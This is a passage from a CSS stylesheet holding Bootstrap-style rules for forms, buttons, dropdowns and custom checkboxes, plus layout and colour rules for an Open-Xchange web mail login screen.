            height: auto
        }

        @media screen and (-webkit-min-device-pixel-ratio:0) {

            input[type=date].form-control,
            input[type=time].form-control,
            input[type=datetime-local].form-control,
            input[type=month].form-control {
                line-height: 30px
            }

            input[type=date].input-sm,
            input[type=time].input-sm,
            input[type=datetime-local].input-sm,
            input[type=month].input-sm,
            .input-group-sm input[type=date],
            .input-group-sm input[type=time],
            .input-group-sm input[type=datetime-local],
            .input-group-sm input[type=month] {
                line-height: 30px
            }

            input[type=date].input-lg,
            input[type=time].input-lg,
            input[type=datetime-local].input-lg,
            input[type=month].input-lg,
            .input-group-lg input[type=date],
            .input-group-lg input[type=time],
            .input-group-lg input[type=datetime-local],
            .input-group-lg input[type=month] {
                line-height: 46px
            }
        }

        .form-group {
            margin-bottom: 15px
        }

        .radio,
        .checkbox {
            position: relative;
            display: block;
            margin-top: 10px;
            margin-bottom: 10px
        }

        .radio.disabled label,
        .checkbox.disabled label,
        fieldset[disabled] .radio label,
        fieldset[disabled] .checkbox label {
            cursor: not-allowed
        }

        .radio label,
        .checkbox label {
            min-height: 20px;
            padding-left: 20px;
            margin-bottom: 0;
            font-weight: 400;
            cursor: pointer
        }

        .radio input[type=radio],
        .radio-inline input[type=radio],
        .checkbox input[type=checkbox],
        .checkbox-inline input[type=checkbox] {
            position: absolute;
            margin-top: 4px \9;
            margin-left: -20px
        }

        .radio+.radio,
        .checkbox+.checkbox {
            margin-top: -5px
        }

        .radio-inline,
        .checkbox-inline {
            position: relative;
            display: inline-block;
            padding-left: 20px;
            margin-bottom: 0;
            font-weight: 400;
            vertical-align: middle;
            cursor: pointer
        }

        .radio-inline.disabled,
        .checkbox-inline.disabled,
        fieldset[disabled] .radio-inline,
        fieldset[disabled] .checkbox-inline {
            cursor: not-allowed
        }

        .radio-inline+.radio-inline,
        .checkbox-inline+.checkbox-inline {
            margin-top: 0;
            margin-left: 10px
        }

        .form-control-static {
            min-height: 34px;
            padding-top: 5px;
            padding-bottom: 5px;
            margin-bottom: 0
        }

        .form-control-static.input-lg,
        .form-control-static.input-sm {
            padding-right: 0;
            padding-left: 0
        }

        .input-sm {
            height: 30px;
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px
        }

        select.input-sm {
            height: 30px;
            line-height: 30px
        }

        textarea.input-sm,
        select[multiple].input-sm {
            height: auto
        }

        .form-group-sm .form-control {
            height: 30px;
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px
        }

        .form-group-sm select.form-control {
            height: 30px;
            line-height: 30px
        }

        .form-group-sm textarea.form-control,
        .form-group-sm select[multiple].form-control {
            height: auto
        }

        .form-group-sm .form-control-static {
            height: 30px;
            min-height: 32px;
            padding: 6px 10px;
            font-size: 12px;
            line-height: 1.5
        }

        .input-lg {
            height: 46px;
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
            border-radius: 3px
        }

        select.input-lg {
            height: 46px;
            line-height: 46px
        }

        textarea.input-lg,
        select[multiple].input-lg {
            height: auto
        }

        .form-group-lg .form-control {
            height: 46px;
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
            border-radius: 3px
        }

        .form-group-lg select.form-control {
            height: 46px;
            line-height: 46px
        }

        .form-group-lg textarea.form-control,
        .form-group-lg select[multiple].form-control {
            height: auto
        }

        .form-group-lg .form-control-static {
            height: 46px;
            min-height: 38px;
            padding: 11px 16px;
            font-size: 18px;
            line-height: 1.3333333
        }

        .has-feedback {
            position: relative
        }

        .has-feedback .form-control {
            padding-right: 37.5px
        }

        .form-control-feedback {
            position: absolute;
            top: 0;
            right: 0;
            z-index: 2;
            display: block;
            width: 30px;
            height: 30px;
            line-height: 30px;
            text-align: center;
            pointer-events: none
        }

        .input-lg+.form-control-feedback,
        .input-group-lg+.form-control-feedback,
        .form-group-lg .form-control+.form-control-feedback {
            width: 46px;
            height: 46px;
            line-height: 46px
        }

        .input-sm+.form-control-feedback,
        .input-group-sm+.form-control-feedback,
        .form-group-sm .form-control+.form-control-feedback {
            width: 30px;
            height: 30px;
            line-height: 30px
        }

        .has-success .help-block,
        .has-success .control-label,
        .has-success .radio,
        .has-success .checkbox,
        .has-success .radio-inline,
        .has-success .checkbox-inline,
        .has-success.radio label,
        .has-success.checkbox label,
        .has-success.radio-inline label,
        .has-success.checkbox-inline label {
            color: #3c763d
        }

        .has-success .form-control {
            border-color: #3c763d;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075)
        }

        .has-success .form-control:focus {
            border-color: #2b542c;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #67b168;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #67b168
        }

        .has-success .input-group-addon {
            color: #3c763d;
            background-color: #dff0d8;
            border-color: #3c763d
        }

        .has-success .form-control-feedback {
            color: #3c763d
        }

        .has-warning .help-block,
        .has-warning .control-label,
        .has-warning .radio,
        .has-warning .checkbox,
        .has-warning .radio-inline,
        .has-warning .checkbox-inline,
        .has-warning.radio label,
        .has-warning.checkbox label,
        .has-warning.radio-inline label,
        .has-warning.checkbox-inline label {
            color: #8a6d3b
        }

        .has-warning .form-control {
            border-color: #8a6d3b;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075)
        }

        .has-warning .form-control:focus {
            border-color: #66512c;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #c0a16b;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #c0a16b
        }

        .has-warning .input-group-addon {
            color: #8a6d3b;
            background-color: #fcf8e3;
            border-color: #8a6d3b
        }

        .has-warning .form-control-feedback {
            color: #8a6d3b
        }

        .has-error .help-block,
        .has-error .control-label,
        .has-error .radio,
        .has-error .checkbox,
        .has-error .radio-inline,
        .has-error .checkbox-inline,
        .has-error.radio label,
        .has-error.checkbox label,
        .has-error.radio-inline label,
        .has-error.checkbox-inline label {
            color: #a94442
        }

        .has-error .form-control {
            border-color: #a94442;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075)
        }

        .has-error .form-control:focus {
            border-color: #843534;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483
        }

        .has-error .input-group-addon {
            color: #a94442;
            background-color: #f2dede;
            border-color: #a94442
        }

        .has-error .form-control-feedback {
            color: #a94442
        }

        .has-feedback label~.form-control-feedback {
            top: 25px
        }

        .has-feedback label.sr-only~.form-control-feedback {
            top: 0
        }

        .help-block {
            display: block;
            margin-top: 5px;
            margin-bottom: 10px;
            color: #737373
        }

        @media (min-width:768px) {
            .form-inline .form-group {
                display: inline-block;
                margin-bottom: 0;
                vertical-align: middle
            }

            .form-inline .form-control {
                display: inline-block;
                width: auto;
                vertical-align: middle
            }

            .form-inline .form-control-static {
                display: inline-block
            }

            .form-inline .input-group {
                display: inline-table;
                vertical-align: middle
            }

            .form-inline .input-group .input-group-addon,
            .form-inline .input-group .input-group-btn,
            .form-inline .input-group .form-control {
                width: auto
            }

            .form-inline .input-group>.form-control {
                width: 100%
            }

            .form-inline .control-label {
                margin-bottom: 0;
                vertical-align: middle
            }

            .form-inline .radio,
            .form-inline .checkbox {
                display: inline-block;
                margin-top: 0;
                margin-bottom: 0;
                vertical-align: middle
            }

            .form-inline .radio label,
            .form-inline .checkbox label {
                padding-left: 0
            }

            .form-inline .radio input[type=radio],
            .form-inline .checkbox input[type=checkbox] {
                position: relative;
                margin-left: 0
            }

            .form-inline .has-feedback .form-control-feedback {
                top: 0
            }
        }

        .form-horizontal .radio,
        .form-horizontal .checkbox,
        .form-horizontal .radio-inline,
        .form-horizontal .checkbox-inline {
            padding-top: 5px;
            margin-top: 0;
            margin-bottom: 0
        }

        .form-horizontal .radio,
        .form-horizontal .checkbox {
            min-height: 25px
        }

        .form-horizontal .form-group {
            margin-right: -15px;
            margin-left: -15px
        }

        @media (min-width:768px) {
            .form-horizontal .control-label {
                padding-top: 5px;
                margin-bottom: 0;
                text-align: right
            }
        }

        .form-horizontal .has-feedback .form-control-feedback {
            right: 15px
        }

        @media (min-width:768px) {
            .form-horizontal .form-group-lg .control-label {
                padding-top: 11px;
                font-size: 18px
            }
        }

        @media (min-width:768px) {
            .form-horizontal .form-group-sm .control-label {
                padding-top: 6px;
                font-size: 12px
            }
        }

        .btn {
            display: inline-block;
            margin-bottom: 0;
            font-weight: 400;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            touch-action: manipulation;
            cursor: pointer;
            background-image: none;
            border: 1px solid transparent;
            padding: 4px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            border-radius: 3px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none
        }

        .btn:focus,
        .btn:active:focus,
        .btn.active:focus,
        .btn.focus,
        .btn:active.focus,
        .btn.active.focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px
        }

        .btn:hover,
        .btn:focus,
        .btn.focus {
            color: #333;
            text-decoration: none
        }

        .btn:active,
        .btn.active {
            background-image: none;
            outline: 0;
            -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, .125);
            box-shadow: inset 0 3px 5px rgba(0, 0, 0, .125)
        }

        .btn.disabled,
        .btn[disabled],
        fieldset[disabled] .btn {
            cursor: not-allowed;
            filter: alpha(opacity=65);
            opacity: .65;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        a.btn.disabled,
        fieldset[disabled] a.btn {
            pointer-events: none
        }

        .btn-default {
            color: #333;
            background-color: #fff;
            border-color: #ccc
        }

        .btn-default:focus,
        .btn-default.focus {
            color: #333;
            background-color: #e6e6e6;
            border-color: #8c8c8c
        }

        .btn-default:hover {
            color: #333;
            background-color: #e6e6e6;
            border-color: #adadad
        }

        .btn-default:active,
        .btn-default.active,
        .open>.dropdown-toggle.btn-default {
            color: #333;
            background-color: #e6e6e6;
            background-image: none;
            border-color: #adadad
        }

        .btn-default .badge {
            color: #fff;
            background-color: #333
        }

        .btn-primary {
            color: #fff;
            background-color: #3c61aa;
            border-color: #355697
        }

        .btn-primary:focus,
        .btn-primary.focus {
            color: #fff;
            background-color: #2f4b84;
            border-color: #142039
        }

        .btn-primary:hover {
            color: #fff;
            background-color: #2f4b84;
            border-color: #253c6a
        }

        .btn-primary:active,
        .btn-primary.active,
        .open>.dropdown-toggle.btn-primary {
            color: #fff;
            background-color: #2f4b84;
            background-image: none;
            border-color: #253c6a
        }

        .btn-primary .badge {
            color: #3c61aa;
            background-color: #fff
        }

        .btn-success {
            color: #fff;
            background-color: #198819;
            border-color: #157215
        }

        .btn-success:focus,
        .btn-success.focus {
            color: #fff;
            background-color: #115d11;
            border-color: #010701
        }

        .btn-success:hover {
            color: #fff;
            background-color: #115d11;
            border-color: #0c3f0c
        }

        .btn-success:active,
        .btn-success.active,
        .open>.dropdown-toggle.btn-success {
            color: #fff;
            background-color: #115d11;
            background-image: none;
            border-color: #0c3f0c
        }

        .btn-success .badge {
            color: #198819;
            background-color: #fff
        }

        .btn-info {
            color: #fff;
            background-color: #5bc0de;
            border-color: #46b8da
        }

        .btn-info:focus,
        .btn-info.focus {
            color: #fff;
            background-color: #31b0d5;
            border-color: #1b6d85
        }

        .btn-info:hover {
            color: #fff;
            background-color: #31b0d5;
            border-color: #269abc
        }

        .btn-info:active,
        .btn-info.active,
        .open>.dropdown-toggle.btn-info {
            color: #fff;
            background-color: #31b0d5;
            background-image: none;
            border-color: #269abc
        }

        .btn-info .badge {
            color: #5bc0de;
            background-color: #fff
        }

        .btn-warning {
            color: #764500;
            background-color: #fbb450;
            border-color: #faa937
        }

        .btn-warning:focus,
        .btn-warning.focus {
            color: #764500;
            background-color: #fa9f1e;
            border-color: #ae6704
        }

        .btn-warning:hover {
            color: #764500;
            background-color: #fa9f1e;
            border-color: #ef8e05
        }

        .btn-warning:active,
        .btn-warning.active,
        .open>.dropdown-toggle.btn-warning {
            color: #764500;
            background-color: #fa9f1e;
            background-image: none;
            border-color: #ef8e05
        }

        .btn-warning .badge {
            color: #fbb450;
            background-color: #764500
        }

        .btn-danger {
            color: #fff;
            background-color: #df332e;
            border-color: #d32520
        }

        .btn-danger:focus,
        .btn-danger.focus {
            color: #fff;
            background-color: #bd211d;
            border-color: #65120f
        }

        .btn-danger:hover {
            color: #fff;
            background-color: #bd211d;
            border-color: #9e1c18
        }

        .btn-danger:active,
        .btn-danger.active,
        .open>.dropdown-toggle.btn-danger {
            color: #fff;
            background-color: #bd211d;
            background-image: none;
            border-color: #9e1c18
        }

        .btn-danger .badge {
            color: #df332e;
            background-color: #fff
        }

        .btn-link {
            font-weight: 400;
            color: #3c61aa;
            border-radius: 0
        }

        .btn-link,
        .btn-link:active,
        .btn-link.active,
        .btn-link[disabled],
        fieldset[disabled] .btn-link {
            background-color: transparent;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .btn-link,
        .btn-link:hover,
        .btn-link:focus,
        .btn-link:active {
            border-color: transparent
        }

        .btn-link:hover,
        .btn-link:focus {
            color: #284171;
            text-decoration: underline;
            background-color: transparent
        }

        .btn-link[disabled]:hover,
        fieldset[disabled] .btn-link:hover,
        .btn-link[disabled]:focus,
        fieldset[disabled] .btn-link:focus {
            color: #777;
            text-decoration: none
        }

        .btn-lg {
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
            border-radius: 3px
        }

        .btn-sm {
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px
        }

        .btn-xs {
            padding: 1px 5px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px
        }

        .btn-block {
            display: block;
            width: 100%
        }

        .btn-block+.btn-block {
            margin-top: 5px
        }

        input[type=submit].btn-block,
        input[type=reset].btn-block,
        input[type=button].btn-block {
            width: 100%
        }

        .caret {
            display: inline-block;
            width: 0;
            height: 0;
            margin-left: 2px;
            vertical-align: middle;
            border-top: 4px dashed;
            border-top: 4px solid \9;
            border-right: 4px solid transparent;
            border-left: 4px solid transparent
        }

        .dropup,
        .dropdown {
            position: relative
        }

        .dropdown-toggle:focus {
            outline: 0
        }

        .dropdown-menu {
            position: absolute;
            top: 100%;
            left: 0;
            z-index: 1000;
            display: none;
            float: left;
            min-width: 160px;
            padding: 5px 0;
            margin: 2px 0 0;
            font-size: 14px;
            text-align: left;
            list-style: none;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #ccc;
            border: 1px solid rgba(0, 0, 0, .15);
            border-radius: 3px;
            -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
            box-shadow: 0 6px 12px rgba(0, 0, 0, .175)
        }

        .dropdown-menu.pull-right {
            right: 0;
            left: auto
        }

        .dropdown-menu .divider {
            height: 1px;
            margin: 9px 0;
            overflow: hidden;
            background-color: #e5e5e5
        }

        .dropdown-menu>li>a {
            display: block;
            padding: 3px 20px;
            clear: both;
            font-weight: 400;
            line-height: 1.42857143;
            color: #333;
            white-space: nowrap
        }

        .dropdown-menu>li>a:hover,
        .dropdown-menu>li>a:focus {
            color: #262626;
            text-decoration: none;
            background-color: #f5f5f5
        }

        .dropdown-menu>.active>a,
        .dropdown-menu>.active>a:hover,
        .dropdown-menu>.active>a:focus {
            color: #fff;
            text-decoration: none;
            background-color: #283f73;
            outline: 0
        }

        .dropdown-menu>.disabled>a,
        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            color: #777
        }

        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            text-decoration: none;
            cursor: not-allowed;
            background-color: transparent;
            background-image: none;
            filter: progid:DXImageTransform.Microsoft.gradient(enabled=false)
        }

        .open>.dropdown-menu {
            display: block
        }

        .open>a {
            outline: 0
        }

        .dropdown-menu-right {
            right: 0;
            left: auto
        }

        .dropdown-menu-left {
            right: auto;
            left: 0
        }

        .dropdown-header {
            display: block;
            padding: 3px 20px;
            font-size: 12px;
            line-height: 1.42857143;
            color: #777;
            white-space: nowrap
        }

        .dropdown-backdrop {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 990
        }

        .pull-right>.dropdown-menu {
            right: 0;
            left: auto
        }

        .dropup .caret,
        .navbar-fixed-bottom .dropdown .caret {
            content: "";
            border-top: 0;
            border-bottom: 4px dashed;
            border-bottom: 4px solid \9
        }

        .dropup .dropdown-menu,
        .navbar-fixed-bottom .dropdown .dropdown-menu {
            top: auto;
            bottom: 100%;
            margin-bottom: 2px
        }

        @media (min-width:768px) {
            .navbar-right .dropdown-menu {
                right: 0;
                left: auto
            }

            .navbar-right .dropdown-menu-left {
                right: auto;
                left: 0
            }
        }

        .clearfix:before,
        .clearfix:after,
        .dl-horizontal dd:before,
        .dl-horizontal dd:after,
        .container:before,
        .container:after,
        .container-fluid:before,
        .container-fluid:after,
        .row:before,
        .row:after,
        .form-horizontal .form-group:before,
        .form-horizontal .form-group:after {
            display: table;
            content: " "
        }

        .clearfix:after,
        .dl-horizontal dd:after,
        .container:after,
        .container-fluid:after,
        .row:after,
        .form-horizontal .form-group:after {
            clear: both
        }

        .center-block {
            display: block;
            margin-right: auto;
            margin-left: auto
        }

        .pull-right {
            float: right !important
        }

        .pull-left {
            float: left !important
        }

        .hide {
            display: none !important
        }

        .show {
            display: block !important
        }

        .invisible {
            visibility: hidden
        }

        .text-hide {
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0
        }

        .hidden {
            display: none !important
        }

        .affix {
            position: fixed
        }

        .checkbox.custom,
        .radio.custom {
            margin-bottom: 8px;
            padding-left: 2rem;
            font-size: 14px;
            line-height: 24px;
            position: relative
        }

        .checkbox.custom label,
        .radio.custom label {
            padding: 0
        }

        .checkbox.custom input,
        .radio.custom input {
            margin: 0;
            top: 3px;
            left: 0
        }

        .checkbox.custom input:focus,
        .radio.custom input:focus {
            height: 17px;
            width: 16px
        }

        .checkbox.custom input+i.toggle,
        .radio.custom input+i.toggle {
            text-align: left;
            position: absolute;
            min-width: calc(1em + 4px);
            min-height: calc(1em + 4px);
            border-radius: .1875rem;
            border: 1px solid #aaa;
            background-color: #fff;
            font: normal normal normal 12px/1 FontAwesome;
            text-rendering: auto;
            -webkit-font-smoothing: antialiased;
            left: 0;
            top: .5em;
            padding: 1px 0 0 1px;
            transition: background-color .2s
        }

        .checkbox.custom input+i.toggle:before,
        .radio.custom input+i.toggle:before {
            display: none
        }

        .checkbox.custom input:checked+i.toggle,
        .radio.custom input:checked+i.toggle {
            color: #fff;
            background-color: #283f73;
            border-color: transparent
        }

        .checkbox.custom input:checked+i.toggle:before,
        .radio.custom input:checked+i.toggle:before {
            content: "\f00c";
            display: inherit
        }

        .checkbox.custom input:focus+i.toggle,
        .radio.custom input:focus+i.toggle {
            border-color: #03a9f4;
            box-shadow: 0 0 8px 1px rgba(3, 169, 244, .6)
        }

        .checkbox.custom input:disabled+i.toggle,
        .radio.custom input:disabled+i.toggle {
            opacity: .5;
            cursor: not-allowed;
            background-color: #eee
        }

        .checkbox.custom input:checked:disabled+i.toggle,
        .radio.custom input:checked:disabled+i.toggle {
            border-color: #767676;
            background-color: #aaa
        }

        .form-horizontal .checkbox.custom,
        .form-horizontal .radio.custom {
            padding-top: 0;
            top: 5px
        }

        .radio.custom input+i.toggle {
            border-radius: .5rem;
            padding: .25rem
        }

        .radio.custom input:checked+i.toggle:before {
            content: "";
            width: calc(0.25rem + 2px);
            height: calc(0.25rem + 2px);
            border-radius: 50%;
            background-color: #fff
        }

        .checkbox.switch {
            margin-bottom: 8px;
            padding-left: 72px;
            position: relative
        }

        .checkbox.switch label {
            padding: 0;
            line-height: 32px
        }

        .checkbox.switch input+i.toggle {
            position: absolute;
            display: inline-block;
            vertical-align: middle;
            left: 0;
            height: 32px;
            width: 56px;
            border: 1px solid #767676;
            border-radius: 16px;
            margin-right: 16px;
            background-color: #eee;
            transition: border .2s, background-color .2s
        }

        .checkbox.switch input+i.toggle:before {
            content: "";
            position: absolute;
            width: 30px;
            height: 30px;
            top: 0;
            left: 0;
            border-radius: 16px;
            background-color: #fff;
            box-shadow: 0 1px 3px rgba(0, 0, 0, .4);
            transition: left .2s
        }

        .checkbox.switch input:checked+i.toggle {
            border-color: transparent;
            background-color: #558b2f
        }

        .checkbox.switch input:checked+i.toggle:before {
            left: 24px
        }

        .checkbox.switch input:focus+i.toggle {
            border-color: #0064cd;
            box-shadow: 0 0 0 3px rgba(0, 100, 205, .4)
        }

        .checkbox.switch input:disabled+i.toggle {
            opacity: .5;
            cursor: not-allowed
        }

        .checkbox.switch input:checked:disabled+i.toggle {
            border-color: #767676;
            background-color: #aaa
        }

        .checkbox.switch.small {
            padding-left: 56px
        }

        .checkbox.switch.small label {
            line-height: 24px
        }

        .checkbox.switch.small input+i.toggle {
            height: 24px;
            width: 40px;
            border-radius: 12px;
            margin-right: 12px
        }

        .checkbox.switch.small input+i.toggle:before {
            width: 22px;
            height: 22px
        }

        .checkbox.switch.small input:checked+i.toggle:before {
            left: 16px
        }

        @font-face {
            font-family: FontAwesome;
            src: url(../../3rd.party/font-awesome/fonts/fontawesome-webfont.woff2?v=4.7.0) format('woff2'), url(../../3rd.party/font-awesome/fonts/fontawesome-webfont.woff?v=4.7.0) format('woff'), url(../../3rd.party/font-awesome/fonts/fontawesome-webfont.ttf?v=4.7.0) format('truetype'), url(../../3rd.party/font-awesome/fonts/fontawesome-webfont.svg?v=4.7.0#fontawesomeregular) format('svg');
            font-weight: 400;
            font-style: normal
        }

        html {
            font-size: 1rem
        }

        html,
        body {
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"
        }

        html[lang],
        body {
            font-size: 1rem;
            line-height: 1.24rem
        }

        html.baseline #background-loader {
            display: block !important;
            background-color: transparent;
            background-image: url(../default/baseline_8_cyan.png);
            opacity: .5
        }

        html.baseline.red #background-loader {
            background-image: url(../default/baseline_8_red.png);
            opacity: .3
        }

        html.baseline.gray #background-loader {
            background-image: url(../default/baseline_8_gray.png);
            opacity: .8
        }

        .unselectable {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none
        }

        .selectable-text {
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
            cursor: default
        }

        .noscript {
            position: absolute;
            top: 50%;
            left: 50%;
            z-index: 65000;
            width: 400px;
            margin: -50px 0 0 -200px;
            z-index: 65301
        }

        #background-loader {
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 65300;
            background-color: #fff;
            -webkit-transform: translateZ(0)
        }

        .smart-dropdown-container {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: 100000
        }

        .smart-dropdown-container ul {
            overflow-y: auto;
            overflow-x: hidden
        }

        .smart-dropdown-container ul li:first-child.divider {
            display: none
        }

        #io-ox-login-screen~.smart-dropdown-container {
            top: 0
        }

        .touch body #io-ox-login-screen {
            font-size: 14px
        }

        #io-ox-login-screen {
            font: 14px/20px -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"
        }

        #io-ox-login-screen .row label {
            padding-top: inherit;
            font-size: inherit;
            line-height: inherit
        }

        #io-ox-login-screen .form-control {
            padding: 4px 12px
        }

        #io-ox-login-screen {
            height: 100%;
            z-index: 65102;
            color: #fff
        }

        #io-ox-login-screen .no-margin {
            margin: 0
        }

        #io-ox-login-screen.relogin {
            right: auto;
            left: 50%;
            width: 800px;
            margin-left: -400px;
            -webkit-box-shadow: 0 0 70px 5px #000;
            -moz-box-shadow: 0 0 70px 5px #000;
            box-shadow: 0 0 70px 5px #000
        }

        #io-ox-login-screen .io-ox-busy {
            position: relative
        }

        #io-ox-login-screen .io-ox-busy:before {
            position: absolute;
            top: 50%;
            left: 50%;
            margin: -10px 0 0 -10px;
            font-size: 20px;
            font-family: FontAwesome;
            content: '\f021';
            color: rgba(0, 0, 0, .3);
            -moz-animation: fa-spin 1.5s infinite linear;
            -o-animation: fa-spin 1.5s infinite linear;
            -webkit-animation: fa-spin 1.5s infinite linear;
            animation: fa-spin 1.5s infinite linear
        }

        #io-ox-login-screen .help-block {
            margin-bottom: 16px
        }

        #io-ox-login-blocker {
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            background-color: #000;
            opacity: .01;
            filter: alpha(opacity=1);
            z-index: 65000
        }

        .login-spacer {
            flex-grow: 1
        }

        #io-ox-login-container,
        #io-ox-login-background-image {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 100%;
            height: 100%;
            min-height: 100%;
            padding: 0;
            background-size: cover !important;
            overflow-y: auto
        }

        #io-ox-login-container#io-ox-login-container,
        #io-ox-login-background-image#io-ox-login-container {
            background: radial-gradient(at 33% 50%, #4369be, #283f73)
        }

        #io-ox-login-container .login-logo,
        #io-ox-login-background-image .login-logo {
            max-height: 32px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            display: block;
            width: auto;
            height: auto
        }

        #io-ox-login-container .composition-element,
        #io-ox-login-background-image .composition-element {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin: 4px 8px;
            min-width: fit-content
        }

        #io-ox-login-container .composition-element :not(:last-child),
        #io-ox-login-background-image .composition-element :not(:last-child) {
            margin-right: 4px
        }

        #io-ox-login-header {
            width: 100%;
            margin: 0;
            background: linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, 0))
        }

        #io-ox-login-toolbar {
            position: relative;
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px
        }

        #io-ox-login-toolbar label {
            margin-bottom: 0
        }

        #io-ox-login-toolbar div {
            margin-left: 16px;
            margin-right: 16px
        }

        #io-ox-login-toolbar #io-ox-language-list {
            overflow-y: scroll
        }

        #io-ox-login-toolbar * {
            color: #fffff
        }

        #io-ox-login-toolbar>* {
            margin: 0 16px
        }

        #io-ox-login-toolbar>:first-child {
            margin-left: 0
        }

        #io-ox-login-toolbar>:last-child {
            margin-right: 0
        }

        #io-ox-login-content {
            display: flex;
            flex-shrink: 0;
            width: 100%
        }

        #io-ox-login-content .align-center {
            align-self: center
        }

        #io-ox-information-message {
            display: flex;
            margin: 0 auto;
            margin-top: 8px;
            width: 420px
        }

        #io-ox-login-footer {
            width: 100%;
            margin: 64px 0 0;
            padding: 6px 2px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            background-color: rgba(0, 0, 0, .15);
            color: #fff
        }

        #io-ox-login-footer a {
            color: #94c1ec
        }

        #io-ox-login-footer>* {
            margin: 0 8px
        }

        #io-ox-login-footer>:first-child {
            margin-left: 0
        }

        #io-ox-login-footer>:last-child {
            margin-right: 0
        }

        #io-ox-languages {
            display: flex
        }

        #io-ox-languages #language-select option {
            color: #000
        }

        #io-ox-languages :not([role=menuitem]) {
            color: #fff
        }

        #io-ox-languages *>a:not([role=menuitem]),
        #io-ox-languages #language-select,
        #io-ox-languages .toggle-text,
        #io-ox-languages .caret {
            color: #94c1ec
        }

        #io-ox-languages .dropup,
        #io-ox-languages .dropdown {
            display: inline-block
        }

        #io-ox-languages a.lang-label {
            text-decoration: none;
            margin-right: 5px;
            font-weight: 400
        }

        #io-ox-languages a.lang-label:focus {
            outline: 0
        }

        #io-ox-languages a.lang-label:hover {
            text-decoration: none
        }

        #language-select {
            background: 0 0;
            border: 0
        }

        #io-ox-login-box {
            display: flex;
            justify-content: center
        }

        #io-ox-login-box .flex-column {
            display: flex;
            flex-direction: column
        }

        #box-form {
            width: 420px;
            text-align: center;
            border-radius: 6px;
            box-shadow: 0 15px 70px 0 rgba(0, 0, 0, .5)
        }

        #box-form * {
            color: #333
        }

        #box-form a {
            color: #3c61aa
        }

        #box-form * button {
            border-color: #355697;
            background-color: #3c61aa;
            color: #fff
        }

        #box-form-header {
            height: 4rem;
            line-height: 60px;
            font-size: 24px;
            font-weight: 700;
            border-radius: 6px 6px 0 0;
            background-size: cover !important;
            background-position: 50% 50% !important;
            background-color: #f5f5f5;
            color: #333
        }

        #box-form-body {
            min-height: 380px;
            background-color: #fff;
            border-radius: 0 0 6px 6px
        }

        #box-form-body .form-control {
            height: 2.5rem
        }

        #box-form-body form,
        #box-form-body form>div {
            min-height: inherit
        }

        #box-form-body form>div>div.row {
            margin: 4px 0
        }

        #box-form-body form>div {
            display: flex;
            flex-direction: column;
            padding-top: 27px;
            padding-bottom: 32px
        }

        #box-form-body form>div .row.username,
        #box-form-body form>div .row.password {
            margin: 0
        }

        #box-form-body form>div .row.options .checkbox.custom {
            margin-top: 0
        }

        #box-form-body form>div .row.options div {
            margin-top: 4px
        }

        #box-form-body form>div .row.feedback {
            margin-bottom: 14px;
            min-height: 32px
        }

        #box-form-body form>div .row.button {
            display: flex;
            align-items: flex-end;
            margin-top: auto
        }

        #box-form-body form>div .row.button div {
            margin-bottom: 0
        }

        #box-form-body form>div #io-ox-backtosignin {
            margin-top: auto;
            margin-bottom: auto
        }

        #box-form-body form>div #io-ox-forgot-password {
            margin-top: 4px
        }

        #box-form-body *>label {
            margin-bottom: 3px;
            font-size: 13px;
            float: left
        }

        #box-form-body *>a {
            font-size: 13px
        }

